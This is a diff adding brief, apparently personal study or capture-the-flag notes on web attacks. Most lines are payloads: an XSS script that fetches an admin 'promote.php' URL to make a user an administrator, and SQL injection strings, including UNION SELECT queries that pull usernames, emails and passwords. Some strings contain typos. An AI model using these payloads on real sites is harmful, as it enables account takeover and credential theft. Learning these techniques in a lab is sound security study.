@@ -1,0 +1,21 @@
+* web
+** url sanizataion
+can inject javascript
+<a href=""><script></script></a><a href="">Click here </a>
+inject requests
+** cross site scripting
+<script>fetch("http://overflow.fail/tickets/admin/promote.php?username=alice")</script>
+** cross site request forgery
+send a url 
+** sql
+Where Group = ' ' OR ''='''
+
+information_schema
+
+secret_use
+secret_user_37
+
+' UNION SELECT * FROM information_scheme WHERE ''='
+
+
+' UNION SELECT username,email,password FROM users WHERE ''='
